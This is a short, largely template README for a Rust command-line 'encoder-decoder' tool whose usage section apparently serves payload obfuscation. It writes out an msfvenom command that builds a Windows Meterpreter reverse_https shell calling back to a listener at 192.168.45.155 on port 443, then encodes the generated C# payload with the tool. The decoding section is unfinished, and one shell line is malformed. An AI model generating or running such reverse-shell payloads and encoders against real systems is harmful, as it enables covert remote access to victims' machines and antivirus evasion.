# encoder-decoder

A brief description of your CLI tool. What it does, why it exists, and any other important context.

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT)

## Table of Contents

- [Installation](#installation)
- [Usage](#usage)
- [Options](#options)
- [License](#license)

## Installation

**From Source**:

```bash
git clone https://github.com/yourusername/CLI-ToolName.git
cd CLI-ToolName
cargo build --release
```

##Usage

###Encoding

```
msfvenom -p windows/meterpreter/reverse_https LPORT=443 LHOST=192.168.45.155 -f csharp -o raw_payload.cs

encoder-decoder encode -i raw_payload.cs -o encrypted_payload.cs

cat encrypted_payload.cs && key.txt
```

###Decoding
TODO
